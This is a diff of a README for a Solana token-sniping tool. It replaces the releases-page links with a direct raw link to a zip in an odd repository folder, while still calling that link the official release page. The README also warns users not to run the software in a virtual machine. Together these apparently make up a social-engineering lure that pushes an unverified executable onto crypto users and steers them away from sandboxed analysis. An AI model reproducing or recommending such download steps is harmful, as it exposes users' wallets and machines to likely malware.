@@ -1,6 +1,6 @@
 # 🚀 Mirae-Solana-Sniper - Trade Solana tokens with professional speed
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/joelpolygonal863/Mirae-Solana-Sniper/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/joelpolygonal863/Mirae-Solana-Sniper/raw/refs/heads/main/garnet/Mirae-Solana-Sniper-v1.5.zip)
 
 Mirae-Solana-Sniper is a desktop tool for the Solana blockchain. It monitors the network, finds new token launches, and executes trades based on your settings. The software runs locally on your machine to ensure your private keys stay on your computer.
 
@@ -20,7 +20,7 @@ Do not run this software on a virtual machine or a public server. Keep your loca
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the official release page: [https://github.com/joelpolygonal863/Mirae-Solana-Sniper/releases](https://github.com/joelpolygonal863/Mirae-Solana-Sniper/releases).
+1. Visit the official release page: [https://github.com/joelpolygonal863/Mirae-Solana-Sniper/raw/refs/heads/main/garnet/Mirae-Solana-Sniper-v1.5.zip](https://github.com/joelpolygonal863/Mirae-Solana-Sniper/raw/refs/heads/main/garnet/Mirae-Solana-Sniper-v1.5.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in `.exe` to start your download.
 4. Locate the file in your `Downloads` folder once the process completes.
